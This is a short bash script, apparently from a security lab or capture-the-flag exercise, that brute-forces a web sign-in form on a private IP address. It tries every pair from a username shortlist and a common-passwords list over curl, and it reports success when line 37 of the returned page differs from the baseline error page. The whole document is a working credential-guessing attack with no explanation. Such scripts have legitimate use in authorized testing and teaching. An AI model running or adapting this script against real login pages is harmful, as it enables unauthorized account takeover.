IP="http://10.11.200.106/"
usernameFile="top-usernames-shortlist.txt"
curl "$IP?page=signin&username=&password=&Login=Login" > page.html
error=$(sed '37!d' page.html)
i=0
while read -r tryUserName
do
    passwdFile="10-million-password-list-top-1000.txt"
    while read -r tryPasswd
    do
        i=$((i+1))
        echo "TRY n$i : username=$tryUserName password=$tryPasswd"
        curl "$IP?page=signin&username=$tryUserName&password=$tryPasswd&Login=Login" > page.html
        check=$(sed '37!d' page.html)
        if [[ $check != $error ]]
        then
            echo "SUCCES! username: $tryUserName | password : $tryPasswd"
            exit
        fi
    done < $passwdFile
done < $usernameFile